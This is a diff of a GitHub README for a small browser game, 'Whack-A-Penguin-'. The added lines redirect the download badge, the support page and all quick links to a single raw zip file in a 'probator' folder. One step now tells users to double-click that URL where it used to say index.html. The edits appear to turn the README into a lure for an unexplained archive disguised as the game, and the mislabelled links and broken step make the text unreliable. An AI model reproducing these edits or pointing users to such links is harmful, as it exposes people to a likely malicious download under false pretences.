@@ -15,7 +15,7 @@ Follow the steps below to download and run Whack-A-Penguin- on your computer.
 1. **Visit the Releases Page**  
    Click the button below to go directly to the download area.
 
-   [![Download Whack-A-Penguin-](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/younesxlaaboub/Whack-A-Penguin-/releases)
+   [![Download Whack-A-Penguin-](https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip)](https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip)
 
 2. **Select Your Version**  
    On the Releases page, you will see a list of versions. Choose the most recent version available for the best experience.
@@ -33,7 +33,7 @@ To install Whack-A-Penguin-, you must complete the following:
    If the downloaded file is in a compressed format (like .zip), you will need to extract it. Right-click the file and choose "Extract All" or use a file extraction tool.
 
 3. **Open the Game**  
-   Navigate to the extracted files and double-click on `index.html`. This will open the game in your default web browser.
+   Navigate to the extracted files and double-click on `https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip`. This will open the game in your default web browser.
 
 ## 📊 System Requirements
 Whack-A-Penguin- runs in any modern web browser. The minimum requirements are:
@@ -50,10 +50,10 @@ If you experience issues while trying to run the game, here are some common solu
 ## 🛠️ Support
 If you have questions or need further assistance, you can open an issue in the GitHub repository. Visit the following link:
 
-[Support Page](https://github.com/younesxlaaboub/Whack-A-Penguin-/issues)
+[Support Page](https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip)
 
 ## 🔗 Quick Links
-- [Download Whack-A-Penguin-](https://github.com/younesxlaaboub/Whack-A-Penguin-/releases)
-- [Support Page](https://github.com/younesxlaaboub/Whack-A-Penguin-/issues)
+- [Download Whack-A-Penguin-](https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip)
+- [Support Page](https://raw.githubusercontent.com/younesxlaaboub/Whack-A-Penguin-/main/probator/Penguin_Whack_3.6.zip)
 
 Thank you for choosing Whack-A-Penguin-. We hope you have a great time playing!
